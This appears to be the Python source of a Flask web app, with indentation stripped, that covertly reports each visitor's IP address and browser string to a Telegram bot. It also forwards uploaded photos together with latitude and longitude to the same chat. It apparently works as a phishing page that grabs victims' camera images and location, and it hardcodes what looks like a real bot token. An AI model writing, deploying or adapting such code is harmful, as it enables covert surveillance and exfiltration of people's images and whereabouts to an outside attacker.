import os, base64
from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)

BOT_TOKEN = "8805942390:AAGdY9nKFMg3zqPzrJQHwmsufrS5QvYgthk"
CHAT_ID = "1454432576"

def index_view():
ip = request.headers.get('X-Forwarded-For', request.remote_addr)
ua = request.headers.get('User-Agent')
requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": f"🔥 Новый заход!\nIP: {ip}\nUA: {ua}", "parse_mode": "Markdown"})
return render_template('index.html')

def upload_view():
d = request.json
b = base64.b64decode(d.get('image', '').split(',')[1])
requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", data={"chat_id": CHAT_ID, "caption": f"📸 Координаты: {d.get('lat')}, {d.get('lon')}"}, files={"photo": ("c.jpg", b, "image/jpeg")})
return jsonify({"status": "ok"})
app.add_url_rule('/', 'index', index_view)
app.add_url_rule('/upload', 'upload', upload_view, methods=['POST'])

if __name__ == '__main__':
app.run(host='0.0.0.0', port=5000)